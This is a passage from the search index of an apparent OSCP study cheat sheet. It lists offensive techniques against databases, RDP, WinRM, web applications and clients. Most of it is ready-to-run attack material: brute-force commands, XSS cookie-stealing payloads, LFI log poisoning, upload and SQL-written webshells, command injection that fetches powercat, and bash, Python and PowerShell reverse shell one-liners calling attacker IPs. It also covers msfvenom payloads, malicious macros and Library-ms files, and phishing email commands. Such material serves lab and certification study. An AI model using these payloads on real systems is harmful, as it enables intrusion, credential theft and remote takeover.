information_schema.tables;\n# show all columns in a table\nSELECT COLUMN_NAME, DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '&lt;table_name&gt;';\n# select data from a table\nSELECT * FROM &lt;table_name&gt;;\n\n# bruteforce\nhydra mssql://&lt;ip&gt; -L &lt;userlist&gt; -P &lt;wordlist&gt;\npatator mssql_login host=&lt;ip&gt; user=sa password=FILE0 0=&lt;wordlist&gt; -x ignore:fgrep='Login failed for user'\n\n# run commands\nenable_xp_cmdshell\nxp_cmdshell &lt;cmd&gt;\n</code></pre>"},{"location":"10_info_gathering/#rdp-3389","title":"RDP - 3389","text":"<pre><code>nxc rdp &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt;\n\n# bruteforce\nhydra rdp://&lt;ip&gt; -L &lt;userlist&gt; -P &lt;wordlist&gt;\npatator rdp_login host=&lt;ip&gt; user='administrator' password=FILE0 0=&lt;wordlist&gt;\n</code></pre>"},{"location":"10_info_gathering/#winrm-5985-5986-tls","title":"WinRM - 5985, 5986 (TLS)","text":"<pre><code>nxc winrm &lt;ip&gt; -d &lt;domain&gt; -u userlist -p passwordlist\nnxc winrm &lt;ip&gt; -d &lt;domain&gt; -u userlist -p passwordlist -x \"whoami\"\n\n# if the user belongs to the remote management group or has admin privileges\nevil-winrm -i &lt;ip&gt;/&lt;domain&gt; -u &lt;user&gt; -p &lt;pass&gt;\nevil-winrm -i &lt;ip&gt;/&lt;domain&gt; -u &lt;user&gt; -H &lt;hash&gt; \n</code></pre>"},{"location":"10_info_gathering/#redis-6379","title":"Redis - 6379","text":"<p>Tip</p> <p>\ud83c\udf6a Rogue server could work for some instances &gt;= 5.0.5 too!</p> <pre><code>nmap --script redis-info -sV -p 6379 &lt;ip&gt;\n\nredis-cli -h &lt;ip&gt;\n# commands\ninfo\nclient list\nconfig get *\nkeys *\n</code></pre>"},{"location":"11_web_attacks/","title":"\ud83d\udd77\ufe0f Web Application Attacks","text":""},{"location":"11_web_attacks/#xss","title":"XSS","text":"<p>PayloadsAllTheThings &gt; XSS</p> <ul> <li>Locate areas accepting user input (e.g., forms, URL parameters, headers, cookies).</li> <li>Note how inputs are reflected in the application's response or processed.</li> <li>Use URL, Base64, or HTML encoding to bypass filters.</li> <li>Test variations like <code>&lt;img src=x onerror=alert(1)&gt;</code>.</li> </ul> <pre><code>&lt;!-- XSS + CSRF --&gt;\n&lt;img src=x onerror=this.src=\"http://&lt;ip&gt;/change_pass.php?password=123123&amp;confirm_password=123123&amp;submit=submit\"&gt;\n\n&lt;!-- get user's cookies --&gt;\n&lt;img src=x onerror=this.src=\"http://&lt;ip&gt;/?c=\"+document.cookie&gt;\n</code></pre>"},{"location":"11_web_attacks/#path-traversal","title":"Path Traversal","text":"<p>PayloadsAllTheThings &gt; Path Traversal</p> <p>Tip</p> <p>\ud83c\udf6a Don't forget the <code>--path-as-is</code> curl param</p> <pre><code># linux\n../etc/passwd\n# bypass naive filters\n....//....//etc/passwd\n# URL encoding\n/%2e%2e/%2e%2e/%2e%2e/etc/passwd\n# mixing forward and backward slashes\n..\\/..\\/..\\/etc/passwd\n# escaped characters\n....\\/....\\/....\\/etc/passwd\n# windows\n..\\..\\..\\Windows\\win.ini\n# UTF-8 encoding bypass\n..%c0%af..%c0%af..%c0%af/etc/passwd\n\n# curl without path normalization or encoding\ncurl --path-as-is \"http://&lt;url&gt;/index.php?page=../../../etc/passwd\"\n</code></pre>"},{"location":"11_web_attacks/#file-inclusion-vulnerabilities","title":"File Inclusion Vulnerabilities","text":"<p>PayloadsAllTheThings &gt; File Inclusion</p>"},{"location":"11_web_attacks/#local","title":"Local","text":"<pre><code>curl http://&lt;ip&gt;/../../../../../../../../../etc/passwd\n\n# poison a file that execute commands with &lt;?php echo system($_GET['cmd']); ?&gt; for example.\n# perform the path traversal and add the command\ncurl http://&lt;ip&gt;/index.php?page=../../../../../../../../../var/log/apache2/access.log&amp;cmd=ls\n\n# encode commands, for example, a reverse shell like: bash -c \"bash -i &gt;&amp; /dev/tcp/192.168.123.193/4444 0&gt;&amp;1\"\nbash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.230%2F4444%200%3E%261%22\n\n# PHP wrapper\ncurl http://&lt;ip&gt;/index.php?page=php://filter/convert.base64-encode/resource=/var/www/html/backup.php\ncurl \"http://&lt;ip&gt;/index.php?page=data://text/plain,&lt;?php%20echo%20system('uname%20-a');?&gt;\"\n</code></pre>"},{"location":"11_web_attacks/#interesting-files","title":"Interesting files","text":"<p>Tip</p> <p>\ud83d\udcdc Recommended wordlists: /usr/share/seclists/Fuzzing/LFI</p> <p>Tip</p> <p>\ud83c\udf6a Try to run the service locally (docker) to see interesting files and paths.</p> LinuxWindowsPlatform Independent <ul> <li><code>/home/&lt;user&gt;/.ssh/id_rsa</code></li> <li><code>/etc/passwd</code></li> <li><code>/etc/shadow</code></li> <li><code>/etc/hosts</code></li> <li><code>/etc/issue</code></li> <li><code>/proc/version</code></li> <li><code>/proc/cmdline</code></li> <li><code>/proc/self/environ</code></li> <li><code>/var/log/*</code></li> <li><code>/var/log/auth.log</code></li> <li><code>/var/log/secure</code></li> <li><code>/var/log/syslog</code></li> <li><code>/var/log/messages</code></li> <li><code>/var/log/apache2/access.log</code></li> <li><code>/var/log/nginx/access.log</code></li> <li><code>/home/[user]/.bash_history</code></li> <li><code>/var/www/html/</code></li> <li><code>/opt/lampp/htdocs/</code></li> <li><code>/etc/apache2/sites-available/*</code></li> <li><code>/etc/nginx/sites-available/*</code></li> <li><code>/etc/redis/redis.conf</code></li> <li><code>/usr/local/etc/redis/redis.conf</code></li> <li><code>/etc/mysql/my.cnf</code></li> <li><code>/etc/my.cnf</code></li> <li><code>/etc/postgresql/[version]/main/postgresql.conf</code></li> <li><code>/etc/postgresql/[version]/main/pg_hba.conf</code></li> <li><code>/etc/ssh/sshd_config</code></li> <li><code>/etc/ssh/ssh_config</code></li> <li><code>/etc/docker/daemon.json</code></li> <li><code>/var/run/docker.sock</code></li> <li><code>/etc/php/[version]/cli/php.ini</code></li> <li><code>/etc/php/[version]/apache2/php.ini</code></li> <li><code>/etc/mongod.conf</code></li> </ul> <ul> <li><code>C:\\Users\\&lt;user&gt;\\.ssh\\id_rsa</code></li> <li><code>C:\\Windows\\System32\\drivers\\etc\\hosts</code></li> <li><code>C:\\boot.ini</code></li> <li><code>C:\\Windows\\win.ini</code></li> <li><code>C:\\Windows\\System32\\config\\SAM</code></li> <li><code>C:\\inetpub\\wwwroot\\</code></li> <li><code>C:\\Windows\\php.ini</code></li> <li><code>C:\\inetpub\\wwwroot\\web.config</code></li> <li><code>C:\\xampp\\passwords.txt</code></li> <li><code>C:\\xampp\\apache\\bin\\php.ini</code></li> <li><code>C:\\xampp\\apache\\logs\\access.log</code></li> <li><code>C:\\xampp\\apache\\logs\\error.log</code></li> <li><code>C:\\xampp\\apache\\conf\\httpd.conf</code></li> <li><code>C:\\xampp\\filezillaftp\\filezilla server.xml</code></li> <li><code>C:\\xampp\\filezillaftp\\logs</code></li> <li><code>C:\\xampp\\filezillaftp\\logs\\access.log</code></li> <li><code>C:\\xampp\\filezillaftp\\logs\\error.log</code></li> <li><code>C:\\xampp\\mysql\\data\\mysql.err</code></li> <li><code>C:\\xampp\\phpmyadmin\\config.inc</code></li> <li><code>C:\\xampp\\phpmyadmin\\config.inc.php</code></li> <li><code>C:\\xampp\\phpmyadmin\\phpinfo.php</code></li> </ul> <ul> <li><code>wp-config.php</code> (WordPress) - check web root</li> <li><code>.git/config</code> - check web root or user directories</li> <li><code>~/.kube/config</code> - user home directory</li> <li><code>~/.my.cnf</code> - user home directory</li> </ul>"},{"location":"11_web_attacks/#remote","title":"Remote","text":"<pre><code># serve a PHP reverse shell and execute it remotely\npython3 -m http.server 80\ncurl http://&lt;url&gt;/index.php?page=http://&lt;local_ip&gt;/shell.php\n\n# create a samba share with a reverse shell\nservice smbd start   \n# important to create the share outside user homes\ncd /srv\nmkdir share\ncd share\nsudo net usershare add test (pwd) '' 'Everyone:F' guest_ok=y\n\ncurl http://&lt;url&gt;/blog/?lang=\\\\&lt;local_ip&gt;\\test\\reverse.php\n</code></pre>"},{"location":"11_web_attacks/#file-upload","title":"File Upload","text":"<p>PayloadsAllTheThings &gt; File Upload</p> <ul> <li>Rename files to bypass uploader logic such as <code>.phps, .php7, .pHP, .png.php, .php%20</code></li> <li>If the validation is on the frontend, the request can be altered with Caido/Burp by changing the extension.</li> <li>Change Content-Type.</li> <li>Add magic bytes.</li> <li>Embed PHP code in the image file.</li> </ul> <pre><code># after uploading the file\ncurl http://&lt;ip&gt;/uploads/shell.pHP?cmd=dir\n\n# encode a PowerShell reverse shell one-liner to execute with the backdoor\npwsh\n$Text = '$client = New-Object System.Net.Sockets.TCPClient(\"192.168.45.230\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"&gt; \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)\n$EncodedText =[Convert]::ToBase64String($Bytes)\n$EncodedText\n\n# use the encoded one-liner\ncurl http://&lt;ip&gt;/uploads/simple-backdoor.pHP?cmd=powershell%20-encodedCommand%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwA...AGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==\n</code></pre> <ul> <li>Capture NTLM hash</li> </ul> <pre><code># change filename with Caido/Burp to access net share and get NTLM hash\nContent-Disposition: form-data; name=\"myFile\"; filename=\"\\\\\\\\192.168.45.215\\\\test\"\n</code></pre> <ul> <li>Abuse validation on double extension</li> </ul> <pre><code># if a file .php.jpg can be uploaded, try to vi the file and add a php line\n&lt;?php system($_GET['cmd']); ?&gt;\n# then\nhttp://.../image.php.jpg?cmd=nc -e /bin/bash &lt;ip&gt; &lt;port&gt;\n</code></pre>"},{"location":"11_web_attacks/#non-executable-files","title":"Non-Executable Files","text":"<pre><code># check if a file can be uploaded using path traversal, capture the request with Caido/Burp and\n../../../../../../../../test.txt\n\n# inject a public key in root's authorized_keys\nssh-keygen\ncat fileup.pub &gt; authorized_keys\n# capture and repeat the request with path traversal\n../../../../../../../../root/.ssh/authorized_keys\nssh -i fileup -p 2222 root@mountaindesserts.com\n</code></pre>"},{"location":"11_web_attacks/#command-injection","title":"Command Injection","text":"<p>PayloadsAllTheThings &gt; Command Injection</p> <ul> <li>Common separators: <code>&amp; &amp;&amp; || ;</code></li> <li>Try encoded symbols: <code>%3B</code></li> <li>Try terminating quoted context before the command: <code>'; whoami</code> <code>\"&amp;&amp; whoami</code> <code>\"&amp; whoami\"</code></li> </ul> <pre><code># check if a second command can be injected\ncurl -X POST -d 'Archive=git%3Bipconfig' http://192.168.216.189:8000/archive\n# check with unix subshells $(cmd)\ncurl -X POST -d 'username=admin&amp;password=admin&amp;ffa=a$(whoami)' http://192.168.216.16/login\n\n# check how the commands are being executed (cmd or ps)\n(dir 2&gt;&amp;1 *`|echo CMD);&amp;&lt;# rem #&gt;echo PowerShell   # `\ncurl -X POST -d 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.216.189:8000/archive\n\n# start a http server serving powercat and get it with command injection\niwr(\"http://192.168.45.230/powercat.ps1\")|iex;powercat -c 192.168.45.230 -p 4444 -e powershell\n# URL encoded\ncurl -X POST -d 'Archive=git%3Biwr%28%22http%3A%2F%2F192.168.45.230%2Fpowercat.ps1%22%29%7Ciex%3Bpowercat%20-c%20192.168.45.230%20-p%204444%20-e%20powershell' http://192.168.216.189:8000/archive\n</code></pre>"},{"location":"11_web_attacks/#sql-injection","title":"SQL Injection","text":"<p>Portswigger cheatsheet</p> <p>PayloadsAllTheThings</p>"},{"location":"11_web_attacks/#db-basic-recon","title":"DB basic recon","text":"<pre><code># MySQL\nmysql -u root -p'root' -h 192.168.50.16 -P 3306\nselect version();\nselect system_user();\nSELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';\n\n# MSSQL\nimpacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth\nSELECT @@version;\nSELECT name FROM sys.databases;\nSELECT * FROM offsec.information_schema.tables;\nselect * from offsec.dbo.users;\n</code></pre>"},{"location":"11_web_attacks/#identification","title":"Identification","text":"<pre><code> [Nothing]\n'\n\"\n`\n')\n\")\n`)\n'))\n\"))\n`))\n</code></pre>"},{"location":"11_web_attacks/#testing","title":"Testing","text":"<p>Tip</p> <p>\ud83d\udcdc Recommended wordlists: <code>/usr/share/seclists/Fuzzing/Databases/MySQL-SQLi-Login-Bypass.fuzzdb.txt</code></p> <pre><code>' OR '1\n' OR 1 -- -\n\" OR \"\" = \"\n\" OR 1 = 1 -- -\n'OR \"='\n'='\n'LIKE'\n'=0--+\nadmin'-- -\nadmin'--\n</code></pre>"},{"location":"11_web_attacks/#union","title":"Union","text":"<p>Requirements:</p> <ol> <li>The injected UNION query has to include the same number of columns as the original query.</li> <li>The data types need to be compatible between each column.</li> </ol> <pre><code># detect number of columns\n' ORDER BY 1-- //\n' union select 1,2,3,4,5--\n\n# show data on the columns with the same datatype\n' union select database(), user(), @@version, null, null -- //\n\n# show databases\n' union select null, null, null, schema_name from information_schema.schemata-- -'\n# show tables\n' union select null, null, null, table_name from information_schema.tables where table_schema=&lt;table_schema&gt;-- -'\n# show columns \n' union select null, null, null, column_name from information_schema.columns where table_name=&lt;table_name&gt;-- //\n\n# extract data\n' union select null, null, null, group_concat(username, 0x3a, password), null from users -- //\n\n# abuse SELECT INTO_OUTFILE in MySQL\n' UNION SELECT \"&lt;?php system($_GET['cmd']);?&gt;\", null, null, null, null INTO OUTFILE \"/var/www/html/tmp/webshell.php\" -- //\n</code></pre>"},{"location":"11_web_attacks/#blind-time-based","title":"Blind (Time based)","text":"<pre><code># if user exists, app hangs for 3 seconds\n' AND IF (1=1, sleep(3),'false') -- //\n\n# postgresql sleep\n'; select pg_sleep(10);-- -'\n</code></pre>"},{"location":"11_web_attacks/#writing-a-webshell","title":"Writing a webshell","text":"<pre><code>...&amp;limit=100;SELECT SLEEP(10)#...\n...&amp;limit=100;SELECT \"&lt;?php system($_GET['cmd']);?&gt;\" INTO OUTFILE \"/var/www/html/webshell.php\"#...\n</code></pre>"},{"location":"11_web_attacks/#manual-code-execution","title":"Manual Code Execution","text":"<pre><code># activate cmd shell in MSSQL\nSQL&gt; EXECUTE sp_configure 'show advanced options', 1;\nSQL&gt; RECONFIGURE;\nSQL&gt; EXECUTE sp_configure 'xp_cmdshell', 1;\nSQL&gt; RECONFIGURE;\nSQL&gt; EXECUTE xp_cmdshell 'whoami';\n# in newer versions\nSQL&gt; enable_xp_cmdshell\nSQL&gt; xp_cmdshell whoami\n</code></pre>"},{"location":"11_web_attacks/#automated-code-execution","title":"Automated Code Execution","text":"<p>Not allowed on the OSCP exam</p> <pre><code>sqlmap -u http://&lt;ip&gt;/blindsqli.php?user=1 -p user\nsqlmap -u http://&lt;ip&gt;/blindsqli.php?user=1 -p user --dump\n# using a POST request, get a shell\nsqlmap -r post.txt -p item --os-shell --web-root \"/var/www/html/tmp\"\n</code></pre>"},{"location":"11_web_attacks/#ssrf-server-side-request-forgery","title":"SSRF (Server-Side Request Forgery)","text":"<p>PayloadsAllTheThings &gt; SSRF</p> <p>https://app.requestbin.net</p> <ul> <li>Identify features that fetch remote resources (e.g., URL preview, PDF generation, image fetchers) and capture interactions with tools like Burp Collaborator, requestbin.net, canarytokens.org/generate, etc.</li> <li> <p>Test with internal IPs and localhost:</p> <ul> <li><code>http://127.0.0.1</code></li> <li><code>http://localhost</code></li> <li><code>http://[::1]</code></li> </ul> </li> <li> <p>Try different URL encodings and bypasses:</p> <ul> <li><code>http://127.0.0.1%2Fetc%2Fpasswd</code></li> <li><code>http://127.0.0.1:80</code></li> <li><code>http://127.0.0.1@evil.com</code></li> <li><code>http://localhost#@evil.com</code></li> <li><code>http://0x7f000001</code></li> <li><code>http://2130706433</code></li> </ul> </li> <li> <p>Check for SSRF via POST body, headers, or file uploads.</p> </li> <li> <p>Abuse SSRF to:</p> <ul> <li>Access internal admin panels or APIs.</li> <li>Read files via file://, dict://, gopher://, ftp://, etc.</li> <li>Trigger internal services (Redis, GCP/AWS metadata endpoints).</li> <li>Enumerate internal ports.</li> </ul> </li> <li> <p>Use open redirect endpoints to chain SSRF if direct access is blocked.</p> </li> </ul>"},{"location":"11_web_attacks/#xsrf-cross-site-request-forgery","title":"XSRF (Cross-Site Request Forgery)","text":"<p>PayloadsAllTheThings &gt; XSRF</p> <ol> <li>Identify state-changing actions that lack CSRF protection (e.g., no CSRF token, no SameSite cookies).</li> <li>Craft a malicious HTML form or request that submits data to the vulnerable endpoint.</li> <li>Trick the victim into executing the request while authenticated.</li> </ol> <pre><code>http://&lt;url&gt;/change_password?password=1234&amp;retype=1234&amp;submit=1\n</code></pre> <pre><code>&lt;!-- Auto-submitting form --&gt;\n&lt;form action=\"http://target.com/change_email\" method=\"POST\"&gt;\n    &lt;input type=\"hidden\" name=\"email\" value=\"attacker@example.com\"&gt;\n&lt;/form&gt;\n&lt;script&gt;document.forms[0].submit();&lt;/script&gt;\n</code></pre>"},{"location":"12_client-side_attacks/","title":"\ud83c\udfa3 Client-Side Attacks","text":""},{"location":"12_client-side_attacks/#information-gathering","title":"Information Gathering","text":"<pre><code>exiftool &lt;file&gt;\ncanarytokens.com # generate a fake URL to collect victim data\n</code></pre>"},{"location":"12_client-side_attacks/#attacks","title":"Attacks","text":"<p>evil_macro.py</p> <p>malicious-pdf.py</p> <p>MMG-LO</p> <pre><code># create a malicious HTA with msfvenom\nmsfvenom -p windows/shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f hta-psh -o file.hta\n\n# generate a malicious macro for a reverse shell in powershell using base64 for .doc\npython evil_macro.py -l &lt;ip&gt; -p &lt;port&gt; -o macro.txt\n\n# generate a malicious PDF file\npython3 malicious-pdf.py burp-collaborator-url\n\n# generate a malicious odt file\npython mmg-odt.py windows &lt;ip&gt; &lt;port&gt; \n</code></pre>"},{"location":"12_client-side_attacks/#windows-library","title":"Windows Library","text":"<p>In Windows, create a file config.Library-ms, put the attack IP in the URL, and save it.</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;libraryDescription xmlns=\"http://schemas.microsoft.com/windows/2009/library\"&gt;\n&lt;name&gt;@windows.storage.dll,-34582&lt;/name&gt;\n&lt;version&gt;6&lt;/version&gt;\n&lt;isLibraryPinned&gt;true&lt;/isLibraryPinned&gt;\n&lt;iconReference&gt;imageres.dll,-1003&lt;/iconReference&gt;\n&lt;templateInfo&gt;\n&lt;folderType&gt;{7d49d726-3c21-4f05-99aa-fdc2c9474656}&lt;/folderType&gt;\n&lt;/templateInfo&gt;\n&lt;searchConnectorDescriptionList&gt;\n&lt;searchConnectorDescription&gt;\n&lt;isDefaultSaveLocation&gt;true&lt;/isDefaultSaveLocation&gt;\n&lt;isSupported&gt;false&lt;/isSupported&gt;\n&lt;simpleLocation&gt;\n&lt;url&gt;http://192.168.45.152&lt;/url&gt;\n&lt;/simpleLocation&gt;\n&lt;/searchConnectorDescription&gt;\n&lt;/searchConnectorDescriptionList&gt;\n&lt;/libraryDescription&gt;\n</code></pre> <p>Now create a shortcut called install with the attack machine IP:</p> <pre><code>powershell.exe -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.152:3333/powercat.ps1'); powercat -c 192.168.45.152 -p 4444 -e powershell\"\n</code></pre> <p>Transfer them to the attack machine, start a WebDAV server to serve the shortcut, a Python HTTP server to serve the powercat script, a listener to receive the reverse shell, and send the email.</p>"},{"location":"12_client-side_attacks/#create-shortcuts","title":"Create shortcuts","text":""},{"location":"12_client-side_attacks/#windows","title":"Windows","text":"<pre><code>$LnkFile = \"C:\\users\\&lt;user&gt;\\desktop\\Services.lnk\"\nPS C:\\&gt; $WshShell = New-Object -ComObject WScript.Shell\nPS C:\\&gt; $Shortcut = $WshShell.CreateShortcut($LnkFile)\nPS C:\\&gt; $Shortcut.TargetPath = \"\\\\192.168.45.191\\test\\trick.bat\"\nPS C:\\&gt; $Shortcut.Save()\n</code></pre>"},{"location":"12_client-side_attacks/#linux","title":"Linux","text":"<p>ntlm_theft.py</p> <pre><code>python ntlm_theft/ntlm_theft.py -g lnk -s 192.168.45.191 -f Services\n</code></pre>"},{"location":"12_client-side_attacks/#sending-emails","title":"Sending Emails","text":"<pre><code>swaks -t &lt;victim(s)_email&gt; -f &lt;from_email&gt; --server &lt;smtp_server&gt; --body 'click me http://&lt;YOUR_IP&gt;/&lt;MALWARE&gt;' --header \"Subject: Important\" --add-header \"Really: 1.0\" --add-header \"Content-Type: text/html\"  [--attach &lt;ATTACHED_FILE&gt;]\n\nsendEmail -t &lt;victim(s)_email&gt; -u &lt;subject&gt; -m &lt;message&gt; -a &lt;attachment&gt; -s &lt;smtp_server&gt; -f &lt;from_email&gt; -xu &lt;user&gt; -xp &lt;pass&gt;\n</code></pre>"},{"location":"13_exploitation/","title":"\ud83d\udca3 Exploitation","text":""},{"location":"13_exploitation/#locating-public-exploits","title":"Locating Public Exploits","text":"<pre><code># search for an exploit\nsearchsploit &lt;name&gt;\n\n# show the exploit\nsearchsploit -x &lt;id&gt;\n\n# copy the exploit to the current folder\nsearchsploit -m &lt;id&gt;\n\n# NSE\nlocate .nse | grep &lt;name&gt;\nnmap --script-help &lt;name&gt;\n</code></pre>"},{"location":"13_exploitation/#compiling-exploits","title":"Compiling Exploits","text":"<p>Windows: reverse shell using <code>nc.exe</code></p> <pre><code>#include &lt;stdlib.h&gt;\n\nint main(){\n    system(\"C:\\\\programdata\\\\nc.exe -e cmd.exe &lt;ip&gt; &lt;port&gt;\");\n    return 0;\n}\n</code></pre> <p>Linux: add SUID bit to <code>/bin/bash</code></p> <pre><code>#include &lt;stdlib.h&gt;\n\nint main() {\n    system(\"chmod +s /bin/bash\");\n    return 0;\n}\n</code></pre> WindowsLinux <pre><code>sudo apt install mingw-w64\n# 64-bit and 32-bit C++ files\nx86_64-w64-mingw32-g++ myprogram.cpp -o myprogram.exe\ni686-w64-mingw32-g++ myprogram.cpp -o myprogram.exe\n\n# 64-bit and 32-bit C files\nx86_64-w64-mingw32-gcc myprogram.c -o myprogram.exe\ni686-w64-mingw32-gcc myprogram.c -o myprogram.exe\n</code></pre> <pre><code>sudo apt install gcc g++ make\ngcc myprogram.c -o myprogram\ng++ myprogram.cpp -o myprogram\n</code></pre>"},{"location":"13_exploitation/#reverse-shells","title":"Reverse Shells","text":"<p>Tip</p> <p>Beware of reflected ports!</p> <p>revshells.com</p>"},{"location":"13_exploitation/#msfvenom","title":"MSFVenom","text":"<pre><code># stageless x64 shell\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe -o reverse.exe\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf -o reverse.elf\n# meterpreter staged shell\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe -o reverse.exe\nmsfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf -o reverse.elf\n\n\nmsfvenom -p windows/shell/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f asp &gt; shell.asp\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.jsp\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f war &gt; shell.war\nmsfvenom -p php/reverse_php LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.php\n</code></pre>"},{"location":"13_exploitation/#one-liners","title":"One liners","text":"<pre><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/4242 0&gt;&amp;1\n\npython -c 'import \nsocket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'\n\n&lt;?php echo shell_exec('bash -i &gt;&amp; /dev/tcp/10.11.0.106/443 0&gt;&amp;1');?&gt;\n\n# powershell\n# download and execute a file from memory\npowershell -nop -c \"iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); &lt;follow-on commands&gt;\"\n\n$client = New-Object System.Net.Sockets.TCPClient(\"192.168.45.230\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"&gt; \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\n</code></pre>"},{"location":"13_exploitation/#upgrade-a-reverse-shell-into-a-full-tty","title":"Upgrade a Reverse Shell into a full TTY","text":"<p>Spawn a TTY Shell</p> <pre><code># using Python\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\npython3 -c 'import pty; pty.spawn(\"/bin/sh\")'\n\n# if Python is not available\n/bin/bash -i\nscript /dev/null -c bash\n</code></pre> <p>Background the shell and fix settings</p> <pre><code># CTRL+Z\nstty raw -echo; fg\n</code></pre> <p>Set terminal env variables</p> <pre><code>reset xterm\nexport TERM=xterm\nexport SHELL=bash\nstty rows 40 columns 100\n</code></pre>"},{"location":"13_exploitation/#add-tools-to-windows-restricted-shell","title":"Add tools to Windows restricted shell","text":"<pre><code>set PATH=%PATH%;C:\\Windows\\System32;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;\n</code></pre>"},{"location":"13_exploitation/#better-listener-with-rlwrap","title":"Better listener with rlwrap","text":"<pre><code>rlwrap nc -lnvp 4444\n</code></pre>"},{"location":"13_exploitation/#penelope","title":"Penelope","text":"<p>If the fully interactive shell can't be achieved and it's impossible to edit a file, penelope can help.</p> <pre><code>python penelope.py 80\n</code></pre>"},{"location":"13_exploitation/#powercat","title":"Powercat","text":"<p>https://github.com/besimorhino/powercat</p> <pre><code># load the function from .ps1 file:\n.\\powercat.ps1\n# load the function from a URL and connect back to the listener:\nIEX (New-Object System.Net.WebClient).DownloadString('http://&lt;ip&gt;:&lt;port&gt;/powercat.ps1'); powercat -c &lt;ip&gt; -p &lt;port&gt; -e cmd\n</code></pre>"},{"location":"13_exploitation/#check-connectivity","title":"Check Connectivity","text":"<pre><code># on Kali\nsudo tcpdump -i tun0 icmp\n\n# from the target\nping -c 1 &lt;kali_ip&gt;\n</code></pre>"},{"location":"14_password_attacks/","title":"\ud83d\udcc3 Password Attacks","text":""},{"location":"14_password_attacks/#detect-hash-type","title":"Detect hash type","text":"<pre><code>hashid &lt;hash&gt;\n</code></pre>"},{"location":"14_password_attacks/#cracking-hashes","title":"Cracking Hashes","text":""},{"location":"14_password_attacks/#hashcat","title":"Hashcat","text":"<p>Hashcat module numbers</p> <pre><code># find hash module number\nhashcat -h | grep Kerberos\n\nhashcat -m &lt;id&gt; &lt;hash&gt; &lt;wordlist&gt; --force\n# use a rule\nhashcat -m &lt;id&gt; &lt;hash&gt; &lt;wordlist&gt; -r /usr/share/hashcat/rules/rockyou-3000.rule --force\n# show mutated list of password using a rule\nhashcat -r demo.rule --stdout &lt;wordlist&gt;\n</code></pre>"},{"location":"14_password_attacks/#hashcat-rule-set","title":"Hashcat rule set","text":"<pre><code>$X   # Append character X\n^X   # Prepend character X\niNX  # Insert character X at position N\nDN   # Delete character at position N\nrXY  # Replace character X with Y\nTN   # Truncate password to length N\ntN   # Toggle case of character at position N\nu    # Convert entire password to uppercase\nl    # Convert entire password to lowercase\nd    # Duplicate the password\nr    # Reverse the password\nsXY  # Swap character X with Y\nX    # Remove last character\n$    # Append a space\n^    # Prepend a space\n</code></pre>"},{"location":"14_password_attacks/#john","title":"John","text":"<p>John extractors</p> <pre><code>john &lt;hash&gt; --wordlist=&lt;wordlist&gt;\n\n# show subformats\njohn --list=subformats\n\n# to use rules add them to /etc/john/john.conf with a header\n[List.Rules:sshRules]\nc $1 $3 $7 $!\nc $1 $3 $7 $@\nc $1 $3 $7 $#\n\n# use it like\njohn &lt;hash&gt; --wordlist=&lt;wordlist&gt; --rules=sshRules\n\n# extract hashes from encrypted files\nkeepass2john file.kdbx &gt; keepass.hash\nssh2john id_rsa &gt; ssh.hash\n</code></pre>"},{"location":"14_password_attacks/#zip-files","title":"Zip files","text":"<pre><code>fcrackzip -u -D -p &lt;wordlist&gt; &lt;file&gt;.zip\n</code></pre>"},{"location":"14_password_attacks/#common-password-guessing-tactics","title":"Common Password Guessing Tactics","text":"Tactic Example Year/Number Iteration Change years (<code>Pass2023</code> -&gt; <code>Pass2024</code>) or numbers (<code>Pass1</code> -&gt; <code>Pass2</code>). Username as Password <code>username:username</code> or variations (<code>Username123</code>, <code>username!</code>) Company/Service Name + Seasons/Suffix 